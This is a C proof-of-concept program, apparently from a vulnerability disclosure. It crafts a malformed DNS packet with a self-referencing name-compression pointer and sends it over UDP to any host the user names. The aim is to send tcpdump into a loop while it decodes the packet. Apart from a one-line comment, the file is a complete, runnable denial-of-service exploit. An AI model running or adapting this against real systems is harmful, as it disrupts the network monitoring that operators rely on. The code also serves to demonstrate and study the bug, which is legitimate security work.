/* dnsloop.c by Hugo Breton (bretonh@pgci.ca)

   This program illustrates the bug in tcpdump when handling jumps in the DNS
   hostname decompression.
*/


#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>


int main(int argc,char * * argv)
{
        char p[18];
        int sock;
        struct sockaddr_in sin;
        struct hostent * hoste;

        printf("dnsloop.c by Hugo Breton (bretonh@pgci.ca)\n");

        if(argc<2)
        {
                printf("usage: %s host\n",argv[0]);
                return(0);
        }

        bzero((void *) &sin,sizeof(sin));
        sin.sin_family=AF_INET;
        sin.sin_port=htons(53);

        if((sin.sin_addr.s_addr=inet_addr(argv[1]))==-1)
        {
                if((hoste=gethostbyname(argv[1]))==NULL)
                {
                        printf("unknown host %s\n",argv[1]);
                        return(0);
                }
                
                bcopy(hoste->h_addr,&sin.sin_addr.s_addr,4);
        }

        bzero((void *) p,18);
        * ((unsigned short *) (p+0))=htons(867-5309);
        * ((unsigned short *) (p+4))=htons(1);
        * ((unsigned short *) (p+12))=htons(32768+16384+12);
        * ((unsigned short *) (p+14))=htons(1);
        * ((unsigned short *) (p+16))=htons(1);

        if((sock=socket(AF_INET,SOCK_DGRAM,0))==-1)
        {
                printf("unable to create UDP socket\n");
                return(0);
        }

        if(sendto(sock,p,18,0,(struct sockaddr *) &sin,sizeof(sin))==-1)
        {
                printf("unable to send packet\n");
                return(0);
        }

        printf("packet sent to host %s\n",argv[1]);

        return(0);
}
